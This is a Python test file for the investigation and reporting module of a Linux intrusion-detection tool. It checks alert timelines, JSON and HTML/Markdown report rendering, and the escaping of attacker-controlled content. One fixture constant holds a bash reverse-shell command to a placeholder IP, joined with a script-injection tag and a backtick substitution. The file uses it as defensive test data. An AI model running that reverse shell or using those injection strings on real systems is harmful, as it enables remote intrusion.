import json

import pytest

from linuxguard.config import default_rules_path
from linuxguard.detection.pipeline import DetectionPipeline
from linuxguard.detection.rules import RuleEngine, load_rules
from linuxguard.domain.events import EventCategory
from linuxguard.investigation import (
    ReportBuilder,
    TimelineBuilder,
    content_digest,
    format_timestamp,
    render_html,
    render_json,
    render_markdown,
    render_report,
)
from linuxguard.storage.repository import EvidenceStore

MALICIOUS_COMMAND = "bash -c 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1' <script>alert(1)</script> | `x`"


@pytest.fixture
def investigation(tmp_path, make_event):
    rules = load_rules(default_rules_path())
    store = EvidenceStore.open(tmp_path / "investigation.db")
    context_before = make_event(timestamp=1000.0, command_line="whoami", session_id="5", correlation_id="lab/session/5")
    attack = make_event(
        timestamp=1010.0,
        command_line=MALICIOUS_COMMAND,
        executable="/usr/bin/bash",
        session_id="5",
        correlation_id="lab/session/5",
    )
    unrelated = make_event(
        timestamp=1020.0, user="bob", command_line="ls", session_id="9", correlation_id="lab/session/9"
    )
    far_away = make_event(timestamp=9000.0, command_line="id", session_id="5", correlation_id="lab/session/5")
    store.save_events([context_before, attack, unrelated, far_away])
    alerts = DetectionPipeline(RuleEngine(rules)).process_all([context_before, attack])
    store.save_alerts(alerts)
    yield store, rules, alerts[0]
    store.close()


def test_timeline_includes_correlated_context_only(investigation) -> None:
    store, _, alert = investigation
    timeline = TimelineBuilder(store, context_seconds=300).for_alert(alert)
    commands = [entry.event.command_line for entry in timeline.entries]
    assert commands == ["whoami", MALICIOUS_COMMAND]
    assert [entry.is_evidence for entry in timeline.entries] == [False, True]
    assert timeline.entries[1].related_alert_ids == (alert.alert_id,)
    assert timeline.evidence_count == 1


def test_timeline_for_range_filters_users(investigation) -> None:
    store, _, _ = investigation
    timeline = TimelineBuilder(store).for_range(900, 1100, users=["bob"])
    assert [entry.event.user for entry in timeline.entries] == ["bob"]


def test_report_contains_rule_response_and_entities(investigation) -> None:
    store, rules, alert = investigation
    report = ReportBuilder(TimelineBuilder(store), rules).build(alert)
    payload = json.loads(render_json(report))
    assert payload["alert"]["rule_id"] == "LG-EXEC-002"
    assert payload["alert"]["technique"] == "T1059.004"
    assert payload["entities"]["users"] == ["alice"]
    assert any("Isolate the host" in item for item in payload["recommendations"])
    assert payload["timeline"][1]["evidence"] is True


def test_html_report_escapes_attacker_controlled_content(investigation) -> None:
    store, rules, alert = investigation
    content = render_html(ReportBuilder(TimelineBuilder(store), rules).build(alert))
    assert "<script>alert(1)</script>" not in content
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in content
    assert "Content-Security-Policy" in content


def test_markdown_report_neutralises_table_and_code_injection(investigation) -> None:
    store, rules, alert = investigation
    content = render_markdown(ReportBuilder(TimelineBuilder(store), rules).build(alert))
    timeline_rows = [line for line in content.splitlines() if line.startswith("| 1970")]
    assert all(line.count(" | ") == 3 for line in timeline_rows)
    assert "<script>" not in content
    assert content.count("```") == 2


def test_render_report_dispatch_and_digest(investigation) -> None:
    store, rules, alert = investigation
    report = ReportBuilder(TimelineBuilder(store), rules).build(alert)
    assert render_report(report, "md").startswith("# Incident Report")
    with pytest.raises(ValueError):
        render_report(report, "pdf")
    assert content_digest("abc") == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"


def test_timestamp_formatting_is_utc() -> None:
    assert format_timestamp(0) == "1970-01-01 00:00:00.000Z"


def test_anomaly_report_uses_generic_recommendations(tmp_path, make_event) -> None:
    from linuxguard.detection.anomaly import IsolationForestDetector
    from linuxguard.detection.pipeline import DetectionMode
    from tests.helpers import routine_windows, scan_window

    detector = IsolationForestDetector(n_estimators=50).fit(routine_windows(make_event))
    alert = DetectionPipeline(RuleEngine([]), detector, DetectionMode.HYBRID).process_all(
        scan_window(make_event).events
    )[0]
    with EvidenceStore.open(tmp_path / "a.db") as store:
        store.save_alert(alert)
        report = ReportBuilder(TimelineBuilder(store)).build(store.get_alert(alert.alert_id))
    payload = report.to_dict()
    assert payload["alert"]["detector"] == "anomaly"
    assert payload["alert"]["contributions"]
    assert any("baseline" in item for item in payload["recommendations"])
    assert all(event.category == EventCategory.NETWORK_CONNECTION for event in alert.evidence)
